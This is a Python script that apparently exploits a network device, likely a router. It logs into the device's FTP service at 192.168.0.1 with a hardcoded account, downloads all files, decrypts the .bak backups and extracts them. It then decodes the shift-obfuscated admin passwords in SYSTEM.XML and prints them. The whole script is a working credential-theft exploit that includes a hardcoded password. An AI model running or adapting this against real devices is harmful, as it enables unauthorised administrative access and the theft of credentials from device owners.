#!/usr/bin/env python3

import ftplib
import os
import sys
import subprocess
import tarfile
import xml.etree.ElementTree as ET

class FTPDownloader:
    def __init__(self, host, username, password, download_dir=None):
        self.host = host
        self.username = username
        self.password = password
        self.ftp = None
        self.downloaded_files = []
        
        # Create download directory
        if not download_dir:
            import time
            timestamp = str(int(time.time()))
            self.download_dir = f"ftp_{host.replace('.', '_')}_{timestamp}"
        else:
            self.download_dir = download_dir
        
        os.makedirs(self.download_dir, exist_ok=True)
        print(f"Download directory: {self.download_dir}")
    
    def connect(self):
        """Establish FTP connection with passive/active mode handling"""
        try:
            print(f"Connecting to {self.host}...")
            self.ftp = ftplib.FTP()
            self.ftp.connect(self.host, timeout=30)
            self.ftp.login(self.username, self.password)
            
            # Try passive mode first
            try:
                self.ftp.set_pasv(True)
                print("Using passive mode (PASV)")
                self.ftp.pwd()
                print("Successfully connected and authenticated.")
                return True
            except Exception:
                print("Passive mode failed, trying active mode...")
                self.ftp.set_pasv(False)
                self.ftp.pwd()
                print("Using active mode (PORT)")
                print("Successfully connected and authenticated.")
                return True
                    
        except ftplib.error_perm as e:
            print(f"Authentication failed: {e}")
            return False
        except Exception as e:
            print(f"Connection failed: {e}")
            return False
    
    def download_file(self, remote_path, local_path):
        """Download individual file with basic error handling"""
        try:
            # Sanitize filename - replace invalid chars with underscore
            filename = os.path.basename(local_path)
            for char in '<>:"/\\|?*':
                filename = filename.replace(char, '_')
            filename = filename.strip('. ')
            
            local_dir = os.path.dirname(local_path)
            local_path = os.path.join(local_dir, filename)
            
            # Create directory if needed
            if local_dir:
                os.makedirs(local_dir, exist_ok=True)
            
            # Handle file conflicts with simple counter
            if os.path.exists(local_path):
                base, ext = os.path.splitext(local_path)
                counter = 1
                while os.path.exists(f"{base}_{counter}{ext}"):
                    counter += 1
                local_path = f"{base}_{counter}{ext}"
            
            print(f"Downloading: {remote_path} -> {local_path}")
            
            # Set binary mode and navigate to file directory
            self.ftp.voidcmd('TYPE I')
            file_dir = os.path.dirname(remote_path).replace('\\', '/')
            filename = os.path.basename(remote_path)
            
            if file_dir and file_dir != '.':
                self.ftp.cwd('/')
                self.ftp.cwd(file_dir)
            else:
                self.ftp.cwd('/')
            
            # Simple retry mechanism
            for attempt in range(3):
                try:
                    with open(local_path, 'wb') as local_file:
                        self.ftp.retrbinary(f'RETR {filename}', local_file.write)
                    break
                except Exception as e:
                    if attempt < 2:
                        print(f"Download attempt {attempt + 1} failed, retrying...")
                        import time
                        time.sleep(2)
                    else:
                        print(f"Failed to download {remote_path}: {e}")
                        return False
            
            # Basic file size validation
            if os.path.getsize(local_path) == 0:
                print(f"Warning: Downloaded file is empty: {local_path}")
            
            self.downloaded_files.append(local_path)
            return True
            
        except Exception as e:
            print(f"Failed to download {remote_path}: {e}")
            return False
    
    def list_directory_contents(self, path=""):
        """List FTP directory contents using LIST command"""
        try:
            items = []
            
            if path:
                self.ftp.cwd(path)
            else:
                self.ftp.cwd("/")
            
            listing = []
            self.ftp.retrlines('LIST', listing.append)
            
            for line in listing:
                parts = line.split()
                if len(parts) >= 9:
                    permissions = parts[0]
                    filename = ' '.join(parts[8:])
                    
                    if filename not in ['.', '..']:
                        is_directory = permissions.startswith('d')
                        items.append((filename, is_directory))
            
            return items
            
        except Exception as e:
            print(f"Failed to list directory {path}: {e}")
            return []
    
    def recursive_download(self, remote_path="", local_path=""):
        """Recursively download all files and directories"""
        try:
            current_dir = self.ftp.pwd()
            items = self.list_directory_contents(remote_path)
            
            for item_name, is_directory in items:
                remote_item_path = f"{remote_path}/{item_name}" if remote_path else item_name
                local_item_path = os.path.join(local_path, item_name) if local_path else item_name
                
                if is_directory:
                    print(f"Creating directory: {local_item_path}")
                    os.makedirs(local_item_path, exist_ok=True)
                    self.recursive_download(remote_item_path, local_item_path)
                else:
                    self.download_file(remote_item_path, local_item_path)
            
            self.ftp.cwd(current_dir)
            return True
            
        except Exception as e:
            print(f"Error during recursive download: {e}")
            return False
    
    def process_bak_files(self):
        """Find and process all BAK files"""
        print("\nProcessing BAK files...")
        
        # Find BAK files
        bak_files = []
        for root, dirs, files in os.walk(self.download_dir):
            for file in files:
                if file.lower().endswith('.bak'):
                    bak_files.append(os.path.join(root, file))
        
        if not bak_files:
            print("No BAK files found.")
            return
        
        print(f"Found {len(bak_files)} BAK file(s):")
        for bak_file in bak_files:
            print(f"  - {bak_file}")
        
        all_credentials = []
        
        for bak_file in bak_files:
            print(f"\n--- Processing {bak_file} ---")
            
            # Check if BAK file is empty
            if os.path.getsize(bak_file) == 0:
                print(f"Skipping empty BAK file: {bak_file}")
                continue
            
            # Decrypt BAK file
            base_name = os.path.splitext(bak_file)[0]
            tar_gz_path = f"{base_name}.tar.gz"
            
            print(f"Decrypting {bak_file}...")
            
            try:
                result = subprocess.run([
                    sys.executable, "decrypt_tool.py", 
                    '-d', '-i', bak_file, '-o', tar_gz_path
                ], capture_output=True, text=True)
                
                if result.returncode != 0:
                    print(f"Decryption failed: {result.stderr}")
                    continue
                    
                print(f"Successfully decrypted to {tar_gz_path}")
            except Exception as e:
                print(f"Error decrypting {bak_file}: {e}")
                continue
            
            # Extract TAR.GZ
            extract_dir = f"{base_name}_extracted"
            print(f"Extracting {tar_gz_path} to {extract_dir}...")
            
            try:
                with tarfile.open(tar_gz_path, 'r:gz') as tar:
                    tar.extractall(path=extract_dir)
                print(f"Successfully extracted to {extract_dir}")
            except Exception as e:
                print(f"Error extracting {tar_gz_path}: {e}")
                continue
            
            # Find and parse SYSTEM.XML files
            for root, dirs, files in os.walk(extract_dir):
                for file in files:
                    if file.upper() == 'SYSTEM.XML':
                        xml_path = os.path.join(root, file)
                        print(f"Found SYSTEM.XML: {xml_path}")
                        
                        try:
                            tree = ET.parse(xml_path)
                            root_elem = tree.getroot()
                            
                            for admin in root_elem.findall('.//admin'):
                                username = admin.get('username', '')
                                x_password = admin.get('x-password', '')
                                
                                if username or x_password:
                                    # Decode password (shift -1), username is not shifted
                                    decoded_password = ''.join(chr(ord(char) - 1) for char in x_password) if x_password else ''
                                    
                                    all_credentials.append({
                                        'username': username,
                                        'password': decoded_password,
                                        'original_password': x_password
                                    })
                        except Exception as e:
                            print(f"Error parsing XML {xml_path}: {e}")
        
        # Display results
        if all_credentials:
            print("\n" + "="*50)
            print("ADMIN CREDENTIALS FOUND:")
            print("="*50)
            
            for i, cred in enumerate(all_credentials, 1):
                print(f"\nCredential Set {i}:")
                print(f"  Username: {cred['username']}")
                print(f"  Password: {cred['password']} (decoded from: {cred['original_password']})")
        else:
            print("\nNo admin credentials found.")
    
    def disconnect(self):
        """Clean FTP connection closure"""
        if self.ftp:
            try:
                self.ftp.quit()
                print("FTP connection closed.")
            except ftplib.error_temp:
                pass
            except Exception as e:
                print(f"Error closing FTP connection: {e}")
                try:
                    self.ftp.close()
                except:
                    pass

def main():
    # Simple argument parsing
    download_dir = None
    ip_address = '192.168.0.1'
    
    # Parse arguments
    i = 1
    while i < len(sys.argv):
        arg = sys.argv[i]
        if arg in ['-h', '--help']:
            print("Usage: python ftp_downloader_optimized.py [IP] [--download-dir DIR]")
            print("  IP: FTP server IP address (default: 192.168.0.1)")
            print("  --download-dir: Custom download directory")
            return 0
        elif arg == '--download-dir':
            if i + 1 < len(sys.argv):
                download_dir = sys.argv[i + 1]
                i += 2
            else:
                print("Error: --download-dir requires a directory name")
                return 1
        else:
            # Assume it's the IP address if it's not a flag
            if not arg.startswith('--'):
                ip_address = arg
            i += 1
    
    # If no IP provided and no arguments, prompt user
    if len(sys.argv) == 1:
        ip_input = input("Enter FTP server IP address (default: 192.168.0.1): ").strip()
        ip_address = ip_input if ip_input else '192.168.0.1'
    
    # FTP credentials
    username = "ftpuser"
    password = "Rks@zdap1234"
    
    print(f"FTP Recursive Downloader")
    print(f"Target: {ip_address}")
    print(f"Credentials: {username}")
    if download_dir:
        print(f"Custom download directory: {download_dir}")
    print("-" * 40)
    
    # Initialize and run
    downloader = FTPDownloader(ip_address, username, password, download_dir)
    
    if not downloader.connect():
        print("Failed to connect to FTP server.")
        return 1
    
    try:
        print("Starting recursive download...")
        success = downloader.recursive_download("", downloader.download_dir)
        
        if success:
            print(f"\nDownload completed successfully!")
            print(f"Total files downloaded: {len(downloader.downloaded_files)}")
        else:
            print("Download completed with some errors.")
        
        # Process BAK files
        downloader.process_bak_files()
        
    finally:
        downloader.disconnect()
    
    print("\nScript execution completed.")
    return 0

if __name__ == "__main__":
    sys.exit(main())
